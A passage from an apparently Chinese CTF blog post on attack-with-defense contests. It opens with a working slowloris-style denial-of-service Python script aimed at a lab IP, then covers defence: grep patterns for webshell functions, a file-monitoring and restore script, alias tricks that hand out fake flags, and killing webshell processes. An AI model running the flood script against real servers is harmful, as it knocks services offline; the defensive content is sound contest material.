class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">import <span class="hljs-built_in">socket</span><br>import <span class="hljs-built_in">time</span><br>import threading<br><br><span class="hljs-built_in">max</span>=<span class="hljs-number">90000000</span><br>port=<span class="hljs-number">80</span>                 <span class="hljs-comment">#端口</span><br>host=<span class="hljs-string">&quot;192.168.92.154&quot;</span>   <span class="hljs-comment">#IP</span><br>page=<span class="hljs-string">&quot;/index.php&quot;</span><br><br>bag=(<span class="hljs-string">&quot;POST %s HTTP/1.1\r\n&quot;</span><br>    <span class="hljs-string">&quot;host: %s\r\n&quot;</span><br>    <span class="hljs-string">&quot;Content-Length: 1000000000\r\n&quot;</span><br>    <span class="hljs-string">&quot;Cookie: 1998\r\n&quot;</span><br>    <span class="hljs-string">&quot;\r\n&quot;</span> % (page,host))<br><br>socks = []<br><br>def connect():<br>    <span class="hljs-built_in">global</span> socks<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-built_in">max</span>):<br>        s = <span class="hljs-built_in">socket</span>.<span class="hljs-built_in">socket</span>(<span class="hljs-built_in">socket</span>.AF_INET,<span class="hljs-built_in">socket</span>.SOCK_STREAM)<br>        <span class="hljs-keyword">try</span>:<br>            s.connect((host,port))<br>            s.<span class="hljs-built_in">send</span>(bag.encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>            socks.append(s)<br>        except Exception <span class="hljs-keyword">as</span> ex:<br>            <span class="hljs-built_in">time</span>.sleep(<span class="hljs-number">1</span>)<br><br>def <span class="hljs-built_in">send</span>():<br>    <span class="hljs-built_in">global</span> socks<br>    <span class="hljs-keyword">while</span> True:<br>        <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> socks:<br>            <span class="hljs-keyword">try</span>:<br>                print(<span class="hljs-string">&quot;攻击中....&quot;</span>)<br>            except Exception <span class="hljs-keyword">as</span> ex:<br>                socks.remove(s)<br>                s.<span class="hljs-built_in">close</span>()<br>        <span class="hljs-built_in">time</span>.sleep(<span class="hljs-number">0.1</span>)<br><br>One = threading.Thread(target=connect,args=())<br>Two = threading.Thread(target=<span class="hljs-built_in">send</span>,args=())<br>One.<span class="hljs-built_in">start</span>()<br>Two.<span class="hljs-built_in">start</span>()<br></code></pre></td></tr></table></figure><h1 id="防守思路"><a href="#防守思路" class="headerlink" title="防守思路"></a>防守思路</h1><h2 id="基础查杀"><a href="#基础查杀" class="headerlink" title="基础查杀"></a>基础查杀</h2><p>寻找最近20分钟修改过的文件</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> /<span class="hljs-keyword">var</span>/www/html -name *.php -mmin <span class="hljs-number">-20</span><br></code></pre></td></tr></table></figure><p>寻找行数最短的文件：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> ./ -name <span class="hljs-string">&#x27;*.php&#x27;</span> | xargs wc -l | <span class="hljs-built_in">sort</span> -u<br></code></pre></td></tr></table></figure><p>关键字查杀</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> . -name <span class="hljs-string">&#x27;*.php&#x27;</span> | xargs <span class="hljs-keyword">grep</span> -n <span class="hljs-string">&#x27;eval(&#x27;</span><br><span class="hljs-keyword">find</span> . -name <span class="hljs-string">&#x27;*.php&#x27;</span> | xargs <span class="hljs-keyword">grep</span> -n <span class="hljs-string">&#x27;assert&#x27;</span><br><span class="hljs-keyword">find</span> . -name <span class="hljs-string">&#x27;*.php&#x27;</span> | xargs <span class="hljs-keyword">grep</span> -n <span class="hljs-string">&#x27;system()&#x27;</span><br></code></pre></td></tr></table></figure><p>查找命令执行函数</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">find /var/www/html -name <span class="hljs-string">&quot;*.php&quot;</span> |<span class="hljs-type">xargs</span> egrep &#x27;<span class="hljs-built_in">assert</span>|<span class="hljs-type">eval</span>|<span class="hljs-type">phpinfo</span>\(\)|<span class="hljs-type">\(base64_decoolcode</span>|<span class="hljs-type">shell_exec</span>|<span class="hljs-type">passthru</span>|<span class="hljs-type">file_put_contents</span>\(\.\*\$|<span class="hljs-type">base64_decode</span>\(&#x27;<br></code></pre></td></tr></table></figure><h2 id="文件监控"><a href="#文件监控" class="headerlink" title="文件监控"></a>文件监控</h2><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment">#use: python file_check.py ./</span><br><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> shutil<br><span class="hljs-keyword">import</span> ntpath<br><span class="hljs-keyword">import</span> time<br><br>CWD = os.getcwd()<br>FILE_MD5_DICT = &#123;&#125;      <span class="hljs-comment"># 文件MD5字典</span><br>ORIGIN_FILE_LIST = []<br><br><span class="hljs-comment"># 特殊文件路径字符串</span><br>Special_path_str = <span class="hljs-string">&#x27;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#x27;</span><br>bakstring = <span class="hljs-string">&#x27;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#x27;</span><br>logstring = <span class="hljs-string">&#x27;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span><br>webshellstring = <span class="hljs-string">&#x27;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span><br>difffile = <span class="hljs-string">&#x27;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#x27;</span><br><br>Special_string = <span class="hljs-string">&#x27;drops_log&#x27;</span>  <span class="hljs-comment"># 免死金牌</span><br>UNICODE_ENCODING = <span class="hljs-string">&quot;utf-8&quot;</span><br>INVALID_UNICODE_CHAR_FORMAT = <span class="hljs-string">r&quot;\?%02x&quot;</span><br><br><span class="hljs-comment"># 文件路径字典</span><br>spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))<br>Special_path = &#123;<br>    <span class="hljs-string">&#x27;bak&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, bakstring)),<br>    <span class="hljs-string">&#x27;log&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, logstring)),<br>    <span class="hljs-string">&#x27;webshell&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, webshellstring)),<br>    <span class="hljs-string">&#x27;difffile&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, difffile)),<br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">isListLike</span>(<span class="hljs-params">value</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">isinstance</span>(value, (<span class="hljs-built_in">list</span>, <span class="hljs-built_in">tuple</span>, <span class="hljs-built_in">set</span>))<br><br><span class="hljs-comment"># 获取Unicode编码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getUnicode</span>(<span class="hljs-params">value, encoding=<span class="hljs-literal">None</span>, noneToNull=<span class="hljs-literal">False</span></span>):<br><br>    <span class="hljs-keyword">if</span> noneToNull <span class="hljs-keyword">and</span> value <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> NULL<br><br>    <span class="hljs-keyword">if</span> isListLike(value):<br>        value = <span class="hljs-built_in">list</span>(getUnicode(_, encoding, noneToNull) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> value)<br>        <span class="hljs-keyword">return</span> value<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(value, unicode):<br>        <span class="hljs-keyword">return</span> value<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">isinstance</span>(value, basestring):<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">return</span> unicode(value, encoding <span class="hljs-keyword">or</span> UNICODE_ENCODING)<br>            <span class="hljs-keyword">except</span> UnicodeDecodeError, ex:<br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-keyword">return</span> unicode(value, UNICODE_ENCODING)<br>                <span class="hljs-keyword">except</span>:<br>                    value = value[:ex.start] + <span class="hljs-string">&quot;&quot;</span>.join(INVALID_UNICODE_CHAR_FORMAT % <span class="hljs-built_in">ord</span>(_) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> value[ex.start:ex.end]) + value[ex.end:]<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">return</span> unicode(value)<br>        <span class="hljs-keyword">except</span> UnicodeDecodeError:<br>            <span class="hljs-keyword">return</span> unicode(<span class="hljs-built_in">str</span>(value), errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br><br><span class="hljs-comment"># 目录创建</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mkdir_p</span>(<span class="hljs-params">path</span>):<br>    <span class="hljs-keyword">import</span> errno<br>    <span class="hljs-keyword">try</span>:<br>        os.makedirs(path)<br>    <span class="hljs-keyword">except</span> OSError <span class="hljs-keyword">as</span> exc:<br>        <span class="hljs-keyword">if</span> exc.errno == errno.EEXIST <span class="hljs-keyword">and</span> os.path.isdir(path):<br>            <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">else</span>: <span class="hljs-keyword">raise</span><br><br><span class="hljs-comment"># 获取当前所有文件路径</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getfilelist</span>(<span class="hljs-params">cwd</span>):<br>    filelist = []<br>    <span class="hljs-keyword">for</span> root,subdirs, files <span class="hljs-keyword">in</span> os.walk(cwd):<br>        <span class="hljs-keyword">for</span> filepath <span class="hljs-keyword">in</span> files:<br>            originalfile = os.path.join(root, filepath)<br>            <span class="hljs-keyword">if</span> Special_path_str <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> originalfile:<br>                filelist.append(originalfile)<br>    <span class="hljs-keyword">return</span> filelist<br><br><span class="hljs-comment"># 计算机文件MD5值</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calcMD5</span>(<span class="hljs-params">filepath</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filepath,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            md5obj = hashlib.md5()<br>            md5obj.update(f.read())<br>            <span class="hljs-built_in">hash</span> = md5obj.hexdigest()<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span><br>    <span class="hljs-keyword">except</span> Exception, e:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[!] getmd5_error : &#x27;</span> + getUnicode(filepath)<br>        <span class="hljs-built_in">print</span> getUnicode(e)<br>        <span class="hljs-keyword">try</span>:<br>            ORIGIN_FILE_LIST.remove(filepath)<br>            FILE_MD5_DICT.pop(filepath, <span class="hljs-literal">None</span>)<br>        <span class="hljs-keyword">except</span> KeyError, e:<br>            <span class="hljs-keyword">pass</span><br><br><span class="hljs-comment"># 获取所有文件MD5</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getfilemd5dict</span>(<span class="hljs-params">filelist = []</span>):<br>    filemd5dict = &#123;&#125;<br>    <span class="hljs-keyword">for</span> ori_file <span class="hljs-keyword">in</span> filelist:<br>        <span class="hljs-keyword">if</span> Special_path_str <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ori_file:<br>            md5 = calcMD5(os.path.realpath(ori_file))<br>            <span class="hljs-keyword">if</span> md5:<br>                filemd5dict[ori_file] = md5<br>    <span class="hljs-keyword">return</span> filemd5dict<br><br><span class="hljs-comment"># 备份所有文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backup_file</span>(<span class="hljs-params">filelist=[]</span>):<br>    <span class="hljs-comment"># if len(os.listdir(Special_path[&#x27;bak&#x27;])) == 0:</span><br>    <span class="hljs-keyword">for</span> filepath <span class="hljs-keyword">in</span> filelist:<br>        <span class="hljs-keyword">if</span> Special_path_str <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> filepath:<br>            shutil.copy2(filepath, Special_path[<span class="hljs-string">&#x27;bak&#x27;</span>])<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;---------start------------&#x27;</span><br>    <span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> Special_path:<br>        mkdir_p(Special_path[value])<br>    <span class="hljs-comment"># 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件</span><br>    ORIGIN_FILE_LIST = getfilelist(CWD)<br>    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)<br>    backup_file(ORIGIN_FILE_LIST) <span class="hljs-comment"># TODO 备份文件可能会产生重名BUG</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[*] pre work end!&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        file_list = getfilelist(CWD)<br>        <span class="hljs-comment"># 移除新上传文件</span><br>        diff_file_list = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(file_list) ^ <span class="hljs-built_in">set</span>(ORIGIN_FILE_LIST))<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(diff_file_list) != <span class="hljs-number">0</span>:<br>            <span class="hljs-comment"># import pdb;pdb.set_trace()</span><br>            <span class="hljs-keyword">for</span> filepath <span class="hljs-keyword">in</span> diff_file_list:<br>                <span class="hljs-keyword">try</span>:<br>                    f = <span class="hljs-built_in">open</span>(filepath, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br>                <span class="hljs-keyword">except</span> Exception, e:<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">if</span> Special_string <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> f:<br>                    <span class="hljs-keyword">try</span>:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[*] webshell find : &#x27;</span> + getUnicode(filepath)<br>                        shutil.move(filepath, os.path.join(Special_path[<span class="hljs-string">&#x27;webshell&#x27;</span>], ntpath.basename(filepath) + <span class="hljs-string">&#x27;.txt&#x27;</span>))<br>                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;</span>%getUnicode(filepath)<br>                    <span class="hljs-keyword">try</span>:<br>                        f = <span class="hljs-built_in">open</span>(os.path.join(Special_path[<span class="hljs-string">&#x27;log&#x27;</span>], <span class="hljs-string">&#x27;log.txt&#x27;</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br>                        f.write(<span class="hljs-string">&#x27;newfile: &#x27;</span> + getUnicode(filepath) + <span class="hljs-string">&#x27; : &#x27;</span> + <span class="hljs-built_in">str</span>(time.ctime()) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>                        f.close()<br>                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[-] log error : file move error: &#x27;</span> + getUnicode(e)<br><br>        <span class="hljs-comment"># 防止任意文件被修改,还原被修改文件</span><br>        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)<br>        <span class="hljs-keyword">for</span> filekey <span class="hljs-keyword">in</span> md5_dict:<br>            <span class="hljs-keyword">if</span> md5_dict[filekey] != FILE_MD5_DICT[filekey]:<br>                <span class="hljs-keyword">try</span>:<br>                    f = <span class="hljs-built_in">open</span>(filekey, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br>                <span class="hljs-keyword">except</span> Exception, e:<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">if</span> Special_string <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> f:<br>                    <span class="hljs-keyword">try</span>:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[*] file had be change : &#x27;</span> + getUnicode(filekey)<br>                        shutil.move(filekey, os.path.join(Special_path[<span class="hljs-string">&#x27;difffile&#x27;</span>], ntpath.basename(filekey) + <span class="hljs-string">&#x27;.txt&#x27;</span>))<br>                        shutil.move(os.path.join(Special_path[<span class="hljs-string">&#x27;bak&#x27;</span>], ntpath.basename(filekey)), filekey)<br>                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;</span>%getUnicode(filekey)<br>                    <span class="hljs-keyword">try</span>:<br>                        f = <span class="hljs-built_in">open</span>(os.path.join(Special_path[<span class="hljs-string">&#x27;log&#x27;</span>], <span class="hljs-string">&#x27;log.txt&#x27;</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br>                        f.write(<span class="hljs-string">&#x27;diff_file: &#x27;</span> + getUnicode(filekey) + <span class="hljs-string">&#x27; : &#x27;</span> + getUnicode(time.ctime()) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>                        f.close()<br>                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[-] log error : done_diff: &#x27;</span> + getUnicode(filekey)<br>                        <span class="hljs-keyword">pass</span><br>        time.sleep(<span class="hljs-number">2</span>)<br>        <span class="hljs-comment"># print &#x27;[*] &#x27; + getUnicode(time.ctime())</span><br></code></pre></td></tr></table></figure><p>运行</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">python jiankong<span class="hljs-selector-class">.py</span>  /<span class="hljs-selector-tag">var</span>/www/<span class="hljs-selector-tag">html</span><br></code></pre></td></tr></table></figure><h2 id="alias起别名"><a href="#alias起别名" class="headerlink" title="alias起别名"></a>alias起别名</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">alias</span> <span class="hljs-built_in">cat</span>=<span class="hljs-string">&quot;echo nothing&quot;</span><br></code></pre></td></tr></table></figure><p>删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">unalias</span> -a<br></code></pre></td></tr></table></figure><p>对方执行cat &#x2F;flag命令的时候回显就是错误flag</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">alias cat=<span class="hljs-string">&quot;echo `date`|md5sum|cut -d &#x27; &#x27; -f1||&quot;</span><br></code></pre></td></tr></table></figure><p>获取 flag 一般是 curl <a href="http://xxx.com/flag.txt">http://xxx.com/flag.txt</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">alias</span> curl=<span class="hljs-string">&#x27;echo fuckoff&#x27;</span> <span class="hljs-comment">#权限要求较低，可以在这里改成虚假的flag</span><br><span class="hljs-comment"># 或者</span><br><span class="hljs-built_in">chmod</span> -x curl <span class="hljs-comment">#权限要求较高</span><br>/usr/bin curl路径<br></code></pre></td></tr></table></figure><h2 id="杀不死马"><a href="#杀不死马" class="headerlink" title="杀不死马"></a>杀不死马</h2><p>查看进程</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@<span class="hljs-number">1177499</span>f5b23:~# ps aux | grep www-data<br><span class="hljs-attribute">www</span>-data  <span class="hljs-number">4819</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">0</span>.<span class="hljs-number">4</span> <span class="hljs-number">315808</span>  <span class="hljs-number">9016</span> ?        S    Dec16   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> apache2 -D FOREGROUND<br><span class="hljs-attribute">www</span>-data  <span class="hljs-number">6663</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">0</span>.<span class="hljs-number">6</span> <span class="hljs-number">316188</span> <span class="hljs-number">13460</span> ?        S    Dec16   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> apache2 -D FOREGROUND<br><span class="hljs-attribute">www</span>-data  <span class="hljs-number">6675</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">0</span>.<span class="hljs-number">3</span> <span class="hljs-number">315620</span>  <span class="hljs-number">6976</span> ?        S    Dec16   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> apache2 -D FOREGROUND<br><span class="hljs-attribute">www</span>-data  <span class="hljs-number">6690</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">0</span>.<span class="hljs-number">4</span> <span class="hljs-number">315808</span>  <span class="hljs-number">9016</span> ?        S    Dec16   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> apache2 -D FOREGROUND<br><span class="hljs-attribute">www</span>-data  <span class="hljs-number">6693</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">0</span>.<span class="hljs-number">4</span> <span class="hljs-number">315800</span>  <span class="hljs-number">9056</span> ?        S    Dec16   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> apache2 -D FOREGROUND<br><span class="hljs-attribute">www</span>-data  <span class="hljs-number">7170</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">0</span>.<span class="hljs-number">6</span> <span class="hljs-number">316312</span> <span class="hljs-number">14100</span> ?        S    Dec16   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> apache2 -D FOREGROUND<br><span class="hljs-attribute">www</span>-data  <span class="hljs-number">7239</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">0</span>.<span class="hljs-number">6</span> <span class="hljs-number">316172</span> <span class="hljs-number">14020</span> ?        S    Dec16   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> apache2 -D FOREGROUND<br><span class="hljs-attribute">www</span>-data  <span class="hljs-number">7526</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">0</span>.<span class="hljs-number">4</span> <span class="hljs-number">315620</span>  <span class="hljs-number">8364</span> ?        S    Dec16   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> apache2 -D FOREGROUND<br><span class="hljs-attribute">www</span>-data  <span class="hljs-number">8380</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">0</span>.<span class="hljs-number">6</span> <span class="hljs-number">316188</span> <span class="hljs-number">12612</span> ?        S    Dec16   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> apache2 -D FOREGROUND<br><span class="hljs-attribute">www</span>-data <span class="hljs-number">22554</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">0</span>.<span class="hljs-number">3</span> <span class="hljs-number">315564</span>  <span class="hljs-number">7416</span> ?        S    <span class="hljs-number">03</span>:<span class="hljs-number">10</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> apache2 -D FOREGROUND<br><span class="hljs-attribute">root</span>     <span class="hljs-number">25353</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>   <span class="hljs-number">8868</span>  <span class="hljs-number">1544</span> pts/<span class="hljs-number">1</span>    S+   <span class="hljs-number">05</span>:<span class="hljs-number">25</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> grep --color=auto www-data<br></code></pre></td></tr></table></figure><p>(1)杀进程</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kill</span> -<span class="hljs-number">9</span> 对应的进程号<br></code></pre></td></tr></table></figure><p>执行命令</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">ps aux | <span class="hljs-keyword">grep</span> www-data | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs <span class="hljs-keyword">kill</span> -<span class="hljs-number">9</span><br>ps aux | <span class="hljs-keyword">grep</span> www-data | <span class="hljs-keyword">grep</span> -v <span class="hljs-keyword">grep</span> | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs 